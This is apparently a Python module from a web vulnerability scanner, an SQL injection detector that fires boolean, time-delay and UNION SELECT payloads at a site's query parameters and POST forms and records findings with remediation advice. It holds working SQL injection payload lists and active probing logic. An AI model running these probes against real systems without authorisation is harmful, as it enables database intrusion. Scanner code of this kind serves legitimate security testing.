from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from backend.core.request_handler import RequestHandler
from backend.core.response_analyzer import ResponseAnalyzer
from backend.detection.base_detector import BaseDetector, Finding
from backend.payloads.payload_generator import PayloadGenerator


class SQLiDetector(BaseDetector):
    name = "sqli"
    LIKELY_PARAM_NAMES = {
        "q",
        "query",
        "search",
        "id",
        "item",
        "product",
        "category",
        "name",
        "email",
        "username",
        "user",
        "order",
        "sort",
        "filter",
    }
    NOISY_PARAM_NAMES = {"to", "transport", "eio", "t", "sid"}
    LIKELY_PATH_HINTS = ("/api", "/rest", "/search", "/product", "/item", "/user", "/login", "/feedback")
    LOGIN_PATH_HINTS = ("/login", "/rest/user/login", "/saveLoginIp")
    BOOLEAN_TEST_PAIRS = [
        ("1' AND '1'='1", "1' AND '1'='2"),
        ('1" AND "1"="1', '1" AND "1"="2'),
        ("1 OR 1=1--", "1 OR 1=2--"),
        ("1' AND 1=1--", "1' AND 1=2--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND 'a'='a", "1' AND 'a'='b"),
    ]
    TIME_DELAY_PAYLOADS = [
        "1' AND SLEEP(5)--",
        "1); WAITFOR DELAY '0:0:5'--",
        "1'||pg_sleep(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1 AND SLEEP(5)",
        "1 AND WAITFOR DELAY '0:0:5'",
        "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1",
    ]
    UNION_PAYLOADS = [
        "1 UNION SELECT NULL--",
        "1' UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL,NULL--",
    ]

    @staticmethod
    def _build_candidate_urls(url: str, params: list[str]) -> list[tuple[str, str]]:
        parsed = urlparse(url)
        existing = dict(parse_qsl(parsed.query))
        param_names = list(dict.fromkeys([*existing.keys(), *params]))
        candidates: list[tuple[str, str]] = []
        for param in param_names:
            baseline = {name: existing.get(name, "baseline") for name in param_names}
            candidates.append((param, urlunparse(parsed._replace(query=urlencode(baseline)))))
        return candidates

    @classmethod
    def _should_test_get_candidate(cls, url: str, param: str) -> bool:
        lowered_param = param.lower()
        lowered_url = url.lower()
        if lowered_param in cls.NOISY_PARAM_NAMES:
            return False
        if "socket.io" in lowered_url or "/redirect" in lowered_url:
            return False
        return lowered_param in cls.LIKELY_PARAM_NAMES or any(hint in lowered_url for hint in cls.LIKELY_PATH_HINTS)

    @classmethod
    def _should_skip_for_profile(cls, url: str, site_map: dict[str, object]) -> bool:
        lowered_url = url.lower()
        if site_map.get("allow_auth_endpoint_fuzz"):
            return False
        return any(hint.lower() in lowered_url for hint in cls.LOGIN_PATH_HINTS)

    @staticmethod
    def _dedupe_findings(findings: list[Finding]) -> list[Finding]:
        deduped: dict[tuple[str, str | None, str | None, str], Finding] = {}
        for finding in findings:
            key = (finding.detector, finding.parameter, finding.payload, finding.url)
            current = deduped.get(key)
            if current is None or (finding.confidence == "high" and current.confidence != "high"):
                deduped[key] = finding
        return list(deduped.values())

    @staticmethod
    async def _submit_body(
        request_handler: RequestHandler,
        action: str,
        body: dict[str, str],
        content_type: str,
    ):
        if content_type == "json":
            return await request_handler.post_json(action, body)
        return await request_handler.post(action, body)

    async def detect(
        self,
        target_url: str,
        site_map: dict[str, object],
        request_handler: RequestHandler,
    ) -> list[Finding]:
        analyzer = ResponseAnalyzer()
        payloads = PayloadGenerator().sqli_payloads()
        findings: list[Finding] = []

        get_candidates: list[tuple[str, str]] = []
        for page in site_map.get("pages", []):
            parsed = urlparse(str(page))
            params = list(dict(parse_qsl(parsed.query)).keys())
            get_candidates.extend(self._build_candidate_urls(str(page), params))
        for endpoint in site_map.get("endpoints", []):
            if not isinstance(endpoint, dict) or str(endpoint.get("method", "get")).lower() != "get":
                continue
            params = [str(name) for name in endpoint.get("query_params", []) if name]
            get_candidates.extend(self._build_candidate_urls(str(endpoint.get("url", "")), params))

        seen_get: set[tuple[str, str]] = set()
        max_params = int(site_map.get("max_detector_params", 6) or 0)
        max_payloads = int(site_map.get("max_payloads_per_param", 2) or 0)
        tested_params = 0
        if max_params <= 0 or max_payloads <= 0:
            return []
        for param, baseline_url in get_candidates:
            if tested_params >= max_params:
                break
            if not param or (baseline_url, param) in seen_get:
                continue
            if self._should_skip_for_profile(baseline_url, site_map):
                continue
            if not self._should_test_get_candidate(baseline_url, param):
                continue
            seen_get.add((baseline_url, param))
            tested_params += 1
            parsed = urlparse(baseline_url)
            baseline_params = dict(parse_qsl(parsed.query))
            try:
                baseline = await request_handler.get(baseline_url)
            except Exception:
                continue
            for payload in payloads[:max_payloads]:
                mutated = baseline_params | {param: payload}
                test_url = urlunparse(parsed._replace(query=urlencode(mutated)))
                try:
                    response = await request_handler.get(test_url)
                except Exception:
                    continue
                has_error = analyzer.has_error_signature(response)
                has_status_anomaly = analyzer.has_status_anomaly(baseline, response)
                has_length_anomaly = analyzer.has_length_anomaly(baseline, response)
                anomaly_score = analyzer.anomaly_score(baseline, response)
                triggered = has_error or (has_status_anomaly and has_length_anomaly and response.status_code >= 500)
                if triggered:
                    validation = analyzer.classify_confidence(
                        error_signature=has_error,
                        anomaly_score=anomaly_score,
                    )
                    findings.append(
                        Finding(
                            detector=self.name,
                            severity="high",
                            url=test_url,
                            evidence=f"Query parameter {param} changed behavior after SQLi payload injection.",
                            recommendation="Use parameterized queries and centralized input validation.",
                            confidence=str(validation["confidence"]),
                            confidence_score=float(validation["confidence_score"]),
                            validation_signals=list(validation["signals"]),
                            parameter=param,
                            payload=payload,
                            method="get",
                            category="query-parameter",
                            baseline_status=baseline.status_code,
                            mutated_status=response.status_code,
                            baseline_length=len(baseline.text),
                            mutated_length=len(response.text),
                            request_snapshot=f"GET {test_url}",
                            response_snapshot=analyzer.snapshot_response(response),
                            reason=(
                                "Database error signature matched the SQLi payload response."
                                if has_error
                                else "Payload caused both a status change and a large response-size anomaly."
                            ),
                            validation_state=str(validation["validation_state"]),
                        )
                    )
                    break
            else:
                if max_payloads < 2:
                    continue
                boolean_finding = await self._probe_boolean_sqli_get(
                    request_handler=request_handler,
                    analyzer=analyzer,
                    parsed=parsed,
                    baseline_url=baseline_url,
                    baseline_params=baseline_params,
                    baseline=baseline,
                    param=param,
                )
                if boolean_finding:
                    findings.append(boolean_finding)
                    continue
                if max_payloads >= 3:
                    time_finding = await self._probe_time_sqli_get(
                        request_handler=request_handler,
                        analyzer=analyzer,
                        parsed=parsed,
                        baseline_params=baseline_params,
                        baseline=baseline,
                        param=param,
                    )
                    if time_finding:
                        findings.append(time_finding)
                        continue
                if max_payloads >= 3:
                    union_finding = await self._probe_union_sqli_get(
                        request_handler=request_handler,
                        analyzer=analyzer,
                        parsed=parsed,
                        baseline_params=baseline_params,
                        baseline=baseline,
                        param=param,
                    )
                    if union_finding:
                        findings.append(union_finding)

        for form in site_map.get("forms", []):
            if not isinstance(form, dict):
                continue
            if not self.allow_active_post_probe(form, site_map):
                continue
            action = str(form.get("action", ""))
            method = str(form.get("method", "get")).lower()
            inputs = [name for name in form.get("inputs", []) if name]
            content_type = str(form.get("content_type", "form")).lower()
            if method != "post" or not action or not inputs:
                continue
            if self._should_skip_for_profile(action, site_map):
                continue
            safe_baseline = {name: "baseline" for name in inputs}
            try:
                baseline = await self._submit_body(request_handler, action, safe_baseline, content_type)
            except Exception:
                continue
            for param in inputs:
                for payload in payloads[:max_payloads]:
                    body = {name: "baseline" for name in inputs}
                    body[param] = payload
                    try:
                        response = await self._submit_body(request_handler, action, body, content_type)
                    except Exception:
                        continue
                    has_error = analyzer.has_error_signature(response)
                    has_status_anomaly = analyzer.has_status_anomaly(baseline, response)
                    has_length_anomaly = analyzer.has_length_anomaly(baseline, response)
                    anomaly_score = analyzer.anomaly_score(baseline, response)
                    if has_error or (has_status_anomaly and has_length_anomaly and response.status_code >= 500):
                        validation = analyzer.classify_confidence(
                            error_signature=has_error,
                            anomaly_score=anomaly_score,
                        )
                        findings.append(
                            Finding(
                                detector=self.name,
                                severity="high",
                                url=action,
                                evidence=f"POST form field {param} produced an anomalous response under SQLi probing.",
                                recommendation="Sanitize server-side form inputs and use bound query parameters.",
                                confidence=str(validation["confidence"]),
                                confidence_score=float(validation["confidence_score"]),
                                validation_signals=list(validation["signals"]),
                                parameter=param,
                                payload=payload,
                                method="post",
                                category="form-field",
                                baseline_status=baseline.status_code,
                                mutated_status=response.status_code,
                                baseline_length=len(baseline.text),
                                mutated_length=len(response.text),
                                request_snapshot=f"POST {action} body[{param}]={payload}",
                                response_snapshot=analyzer.snapshot_response(response),
                                reason=(
                                    "Database error signature matched the SQLi payload response."
                                    if has_error
                                    else "Payload caused both a status change and a large response-size anomaly."
                                ),
                                validation_state=str(validation["validation_state"]),
                            )
                        )
                        break
                else:
                    boolean_finding = await self._probe_boolean_sqli_post(
                        request_handler=request_handler,
                        analyzer=analyzer,
                        action=action,
                        inputs=inputs,
                        baseline=baseline,
                        param=param,
                        content_type=content_type,
                    )
                    if boolean_finding:
                        findings.append(boolean_finding)
                        continue
                    time_finding = await self._probe_time_sqli_post(
                        request_handler=request_handler,
                        analyzer=analyzer,
                        action=action,
                        inputs=inputs,
                        baseline=baseline,
                        param=param,
                        content_type=content_type,
                    )
                    if time_finding:
                        findings.append(time_finding)
                        continue
                    union_finding = await self._probe_union_sqli_post(
                        request_handler=request_handler,
                        analyzer=analyzer,
                        action=action,
                        inputs=inputs,
                        baseline=baseline,
                        param=param,
                        content_type=content_type,
                    )
                    if union_finding:
                        findings.append(union_finding)

        return self._dedupe_findings(findings)

    async def _probe_boolean_sqli_get(
        self,
        request_handler: RequestHandler,
        analyzer: ResponseAnalyzer,
        parsed,
        baseline_url: str,
        baseline_params: dict[str, str],
        baseline,
        param: str,
    ) -> Finding | None:
        for truthy_payload, falsy_payload in self.BOOLEAN_TEST_PAIRS:
            truthy_url = urlunparse(parsed._replace(query=urlencode(baseline_params | {param: truthy_payload})))
            falsy_url = urlunparse(parsed._replace(query=urlencode(baseline_params | {param: falsy_payload})))
            try:
                truthy_response = await request_handler.get(truthy_url)
                falsy_response = await request_handler.get(falsy_url)
            except Exception:
                continue
            if not analyzer.has_boolean_response_delta(baseline, truthy_response, falsy_response):
                continue
            validation = analyzer.classify_confidence(
                boolean_delta=True,
                anomaly_score=max(analyzer.anomaly_score(baseline, truthy_response), analyzer.anomaly_score(baseline, falsy_response)),
            )
            return Finding(
                detector=self.name,
                severity="high",
                url=baseline_url,
                evidence=f"Boolean SQLi behavior detected on query parameter {param}; truthy and falsy payloads produced divergent responses.",
                recommendation="Use parameterized queries and enforce strict server-side input validation.",
                confidence=str(validation["confidence"]),
                confidence_score=float(validation["confidence_score"]),
                validation_signals=list(validation["signals"]),
                parameter=param,
                payload=f"{truthy_payload} | {falsy_payload}",
                method="get",
                category="boolean-query-parameter",
                baseline_status=baseline.status_code,
                mutated_status=truthy_response.status_code,
                baseline_length=len(baseline.text),
                mutated_length=len(truthy_response.text),
                request_snapshot=f"GET {truthy_url}",
                response_snapshot=analyzer.snapshot_response(truthy_response),
                reason=(
                    f"Truthy/falsy payload pair caused response divergence. "
                    f"Truthy length={len(truthy_response.text)}, falsy length={len(falsy_response.text)}."
                ),
                validation_state=str(validation["validation_state"]),
            )
        return None

    async def _probe_time_sqli_get(
        self,
        request_handler: RequestHandler,
        analyzer: ResponseAnalyzer,
        parsed,
        baseline_params: dict[str, str],
        baseline,
        param: str,
    ) -> Finding | None:
        for payload in self.TIME_DELAY_PAYLOADS:
            test_url = urlunparse(parsed._replace(query=urlencode(baseline_params | {param: payload})))
            try:
                response = await request_handler.get(test_url)
            except Exception:
                continue
            if not analyzer.has_time_delay_anomaly(baseline, response):
                continue
            validation = analyzer.classify_confidence(
                time_delay=True,
                anomaly_score=analyzer.anomaly_score(baseline, response),
            )
            return Finding(
                detector=self.name,
                severity="high",
                url=test_url,
                evidence=f"Time-based SQLi signal detected on query parameter {param}; delayed payload increased response time significantly.",
                recommendation="Block SQL meta-characters at validation boundaries and use prepared statements.",
                confidence=str(validation["confidence"]),
                confidence_score=float(validation["confidence_score"]),
                validation_signals=list(validation["signals"]),
                parameter=param,
                payload=payload,
                method="get",
                category="time-based-query-parameter",
                baseline_status=baseline.status_code,
                mutated_status=response.status_code,
                baseline_length=len(baseline.text),
                mutated_length=len(response.text),
                request_snapshot=f"GET {test_url}",
                response_snapshot=analyzer.snapshot_response(response),
                reason=(
                    f"Observed latency delta of {round(response.elapsed_ms - baseline.elapsed_ms, 2)} ms "
                    "after injecting a DB sleep payload."
                ),
                validation_state=str(validation["validation_state"]),
            )
        return None

    async def _probe_boolean_sqli_post(
        self,
        request_handler: RequestHandler,
        analyzer: ResponseAnalyzer,
        action: str,
        inputs: list[str],
        baseline,
        param: str,
        content_type: str,
    ) -> Finding | None:
        for truthy_payload, falsy_payload in self.BOOLEAN_TEST_PAIRS:
            truthy_body = {name: "baseline" for name in inputs}
            falsy_body = {name: "baseline" for name in inputs}
            truthy_body[param] = truthy_payload
            falsy_body[param] = falsy_payload
            try:
                truthy_response = await self._submit_body(request_handler, action, truthy_body, content_type)
                falsy_response = await self._submit_body(request_handler, action, falsy_body, content_type)
            except Exception:
                continue
            if not analyzer.has_boolean_response_delta(baseline, truthy_response, falsy_response):
                continue
            validation = analyzer.classify_confidence(
                boolean_delta=True,
                anomaly_score=max(analyzer.anomaly_score(baseline, truthy_response), analyzer.anomaly_score(baseline, falsy_response)),
            )
            return Finding(
                detector=self.name,
                severity="high",
                url=action,
                evidence=f"Boolean SQLi behavior detected on form field {param}; truthy/falsy SQL conditions altered form response content.",
                recommendation="Use parameterized SQL for form processing and centralize server-side input validation.",
                confidence=str(validation["confidence"]),
                confidence_score=float(validation["confidence_score"]),
                validation_signals=list(validation["signals"]),
                parameter=param,
                payload=f"{truthy_payload} | {falsy_payload}",
                method="post",
                category="boolean-form-field",
                baseline_status=baseline.status_code,
                mutated_status=truthy_response.status_code,
                baseline_length=len(baseline.text),
                mutated_length=len(truthy_response.text),
                request_snapshot=f"POST {action} body[{param}]={truthy_payload}",
                response_snapshot=analyzer.snapshot_response(truthy_response),
                reason=(
                    f"Truthy/falsy payload pair caused response divergence. "
                    f"Truthy length={len(truthy_response.text)}, falsy length={len(falsy_response.text)}."
                ),
                validation_state=str(validation["validation_state"]),
            )
        return None

    async def _probe_time_sqli_post(
        self,
        request_handler: RequestHandler,
        analyzer: ResponseAnalyzer,
        action: str,
        inputs: list[str],
        baseline,
        param: str,
        content_type: str,
    ) -> Finding | None:
        for payload in self.TIME_DELAY_PAYLOADS:
            body = {name: "baseline" for name in inputs}
            body[param] = payload
            try:
                response = await self._submit_body(request_handler, action, body, content_type)
            except Exception:
                continue
            if not analyzer.has_time_delay_anomaly(baseline, response):
                continue
            validation = analyzer.classify_confidence(
                time_delay=True,
                anomaly_score=analyzer.anomaly_score(baseline, response),
            )
            return Finding(
                detector=self.name,
                severity="high",
                url=action,
                evidence=f"Time-based SQLi signal detected on form field {param}; delay payload produced a significant response lag.",
                recommendation="Use prepared statements and reject suspicious SQL control input in form fields.",
                confidence=str(validation["confidence"]),
                confidence_score=float(validation["confidence_score"]),
                validation_signals=list(validation["signals"]),
                parameter=param,
                payload=payload,
                method="post",
                category="time-based-form-field",
                baseline_status=baseline.status_code,
                mutated_status=response.status_code,
                baseline_length=len(baseline.text),
                mutated_length=len(response.text),
                request_snapshot=f"POST {action} body[{param}]={payload}",
                response_snapshot=analyzer.snapshot_response(response),
                reason=(
                    f"Observed latency delta of {round(response.elapsed_ms - baseline.elapsed_ms, 2)} ms "
                    "after injecting a DB sleep payload."
                ),
                validation_state=str(validation["validation_state"]),
            )
        return None

    async def _probe_union_sqli_get(
        self,
        request_handler: RequestHandler,
        analyzer: ResponseAnalyzer,
        parsed,
        baseline_params: dict[str, str],
        baseline,
        param: str,
    ) -> Finding | None:
        for payload in self.UNION_PAYLOADS:
            test_url = urlunparse(parsed._replace(query=urlencode(baseline_params | {param: payload})))
            try:
                response = await request_handler.get(test_url)
            except Exception:
                continue
            has_status_anomaly = analyzer.has_status_anomaly(baseline, response)
            has_length_anomaly = analyzer.has_length_anomaly(baseline, response)
            if not has_status_anomaly and has_length_anomaly and response.status_code < 500:
                validation = analyzer.classify_confidence(
                    boolean_delta=True,
                    anomaly_score=analyzer.anomaly_score(baseline, response),
                )
                return Finding(
                    detector=self.name,
                    severity="high",
                    url=test_url,
                    evidence=f"UNION-based SQLi behavior detected on query parameter {param}.",
                    recommendation="Use parameterized queries and avoid concatenating inputs in UNION clauses.",
                    confidence=str(validation["confidence"]),
                    confidence_score=float(validation["confidence_score"]),
                    validation_signals=list(validation["signals"]),
                    parameter=param,
                    payload=payload,
                    method="get",
                    category="union-based-query-parameter",
                    baseline_status=baseline.status_code,
                    mutated_status=response.status_code,
                    baseline_length=len(baseline.text),
                    mutated_length=len(response.text),
                    request_snapshot=f"GET {test_url}",
                    response_snapshot=analyzer.snapshot_response(response),
                    reason="Payload caused a significant content length anomaly typical of UNION SELECT injection.",
                    validation_state=str(validation["validation_state"]),
                )
        return None

    async def _probe_union_sqli_post(
        self,
        request_handler: RequestHandler,
        analyzer: ResponseAnalyzer,
        action: str,
        inputs: list[str],
        baseline,
        param: str,
        content_type: str,
    ) -> Finding | None:
        for payload in self.UNION_PAYLOADS:
            body = {name: "baseline" for name in inputs}
            body[param] = payload
            try:
                response = await self._submit_body(request_handler, action, body, content_type)
            except Exception:
                continue
            has_status_anomaly = analyzer.has_status_anomaly(baseline, response)
            has_length_anomaly = analyzer.has_length_anomaly(baseline, response)
            if not has_status_anomaly and has_length_anomaly and response.status_code < 500:
                validation = analyzer.classify_confidence(
                    boolean_delta=True,
                    anomaly_score=analyzer.anomaly_score(baseline, response),
                )
                return Finding(
                    detector=self.name,
                    severity="high",
                    url=action,
                    evidence=f"UNION-based SQLi behavior detected on form field {param}.",
                    recommendation="Use parameterized queries and avoid concatenating inputs in UNION clauses.",
                    confidence=str(validation["confidence"]),
                    confidence_score=float(validation["confidence_score"]),
                    validation_signals=list(validation["signals"]),
                    parameter=param,
                    payload=payload,
                    method="post",
                    category="union-based-form-field",
                    baseline_status=baseline.status_code,
                    mutated_status=response.status_code,
                    baseline_length=len(baseline.text),
                    mutated_length=len(response.text),
                    request_snapshot=f"POST {action} body[{param}]={payload}",
                    response_snapshot=analyzer.snapshot_response(response),
                    reason="Payload caused a significant content length anomaly typical of UNION SELECT injection.",
                    validation_state=str(validation["validation_state"]),
                )
        return None
